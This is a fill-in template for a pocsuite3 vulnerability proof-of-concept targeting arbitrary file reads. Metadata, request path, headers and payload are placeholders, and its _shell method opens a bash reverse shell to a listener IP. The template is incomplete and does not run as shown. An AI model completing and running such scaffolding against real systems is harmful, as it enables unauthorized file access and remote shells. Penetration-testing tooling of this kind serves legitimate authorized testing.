#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import *

class DemoPOC(POCBase):
    # 漏洞编号
    vulID = '{$vulID$}'
    # 脚本的版本
    version = '{$version$}'
    # 作者名称
    author = '{$author$}'
    # 漏洞发现时间
    vulDate = '{$vulDate$}'
    # 创建时间
    createDate = '{$createDate$}'
    # 更新时间
    updateDate = '{$updateDate$}'
    # 参考
    references = ['{$references$}']
    # 漏洞名称
    name = '{$name$}'
    # 官网链接
    appPowerLink = '{$appPowerLink$}'
    # 产品名称
    appName = '{$appName$}'
    # 产品版本
    appVersion = ''
    # 漏洞类型
    vulType = 'Arbitrary File Read'
    # 漏洞描述
    desc = '{$desc$}'
    samples = ['']
    # 需要导入的python库
    install_requires = ['']
    # 脚本使用描述
    pocDesc = '{$pocDesc$}'
    # 搜索引擎
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _options(self):
        '''自定义参数'''
        o = OrderedDict()
        o['user'] = OptString('', description='The username to authenticate as', require=True)
        return o

    def _verify(self):
        '''
        调用方式：
        1. 通过--verify参数调用
        2. 不填攻击的模式时默认调用
        '''
        if not self._check(dork=''):
            return False
        # 变量
        result = {}
        param = self.get_option('user') #获取自定义参数
        url = self.url + '{$url_path_verify$}'
        headers = {'{$headers$}'}
        payload = '{$payload$}'
        # 发送请求
        res = requests.{$type$}(url, headers=headers, data=payload)
        # 结果显示
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + '{$url_path_verify$}'
            result['VerifyInfo'][param] = res.text
        return self.parse_output(result)

    def _attack(self):
        '''
        调用方式: 仅通过--attack参数调用
        '''
        if not self._check(dork=''):
            return False
        # 变量
        result = {}
        param = self.get_option('user') #获取自定义参数
        url = self.url + '{$url_path_verify$}'
        headers = {'{$headers$}'}
        payload = '{$payload$}'
        # 发送请求
        res = requests.{$type$}(url, headers=headers, data=payload)
        # 结果显示
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + '{$url_path_verify$}'
            result['VerifyInfo'][param] = res.text
        return self.parse_output(result)


    def _shell(self):
        '''反弹shell'''
        try:
            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
        except Exception:
            pass

register_poc(DemoPOC)

'''
{$origin$}
'''